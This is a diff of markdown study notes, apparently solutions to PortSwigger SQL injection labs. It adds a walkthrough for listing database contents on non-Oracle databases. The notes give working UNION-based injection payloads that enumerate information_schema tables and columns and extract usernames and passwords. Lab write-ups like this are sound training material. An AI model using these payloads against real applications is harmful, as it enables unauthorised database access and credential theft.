@@ -1,8 +1,8 @@
 <div align="center">
-  <h1>-------------------------------LABS---------------------------------</h1>
+  <h1>------------------------------ SQLi LABS 001 -------------------------------</h1>
 </div>
 
-[CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+# [CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
 ## Lab 1: `Retrieving hidden data`, where you can modify a SQL query to return additional results.
 - Original Query: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
@@ -59,10 +59,15 @@
 - Modified:
 ```
 'Union+select+Null,NULL-- To determine the No. of columns
+
 'Union+select+Null,'XYZ'-- To determine which column allows TEXT values
+
 'Union+select+Null,username+from+users-- To retrieve Single TEXT value
+
 'Union+select+Null,password+from+users-- To retrieve Single TEXT value
+
 'Union+select+Null,username||password+from+users-- To retrieve Multiple TEXT value
+
 'Union+select+Null,username||'~'||password+from+users-- To retrieve Multiple TEXT value with separator
 ```
 - Login with Admin Creds to Solve the LAb
@@ -91,12 +96,23 @@
 ```
 
 ## Lab 9: SQL injection attack, listing the database contents on non-Oracle databases [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-examining-the-database-in-sql-injection-attacks/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
+- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
+- A `Common set of views` available in Non-Oracle DBs to list out the tables in the database: `information_schema.tables` as `SELECT * FROM information_schema.tables`
+- Also, To list the columns in individual tables: `information_schema.columns` as `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
+- ![image](https://github.com/user-attachments/assets/bf84e527-c095-4c97-ab4f-eb516c8fd6da)
+
+- Modified:
+```
+'UNION+SELECT+NULL,NULL-- To check the No. of Columns
+
+'UNION+SELECT+version(),NULL--  To check DB version - Mysql
+
+'Union+SELECT+TABLE_NAME,NULL+FROM+information_schema.tables-- To return TABLE_NAME from information_schema.tables views
+
+'UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_wifyly'-- To return column_name from information_schema.columns views
+
+'UNION+SELECT+username_wcliss,password_ozuvxe+FROM+users_wifyly-- TO extract the info from table
+```
 
 
-
-
-
-## Lab 10: [Link]()
-
-## Lab 11: [Link]()
-
+/*The NEXT*/
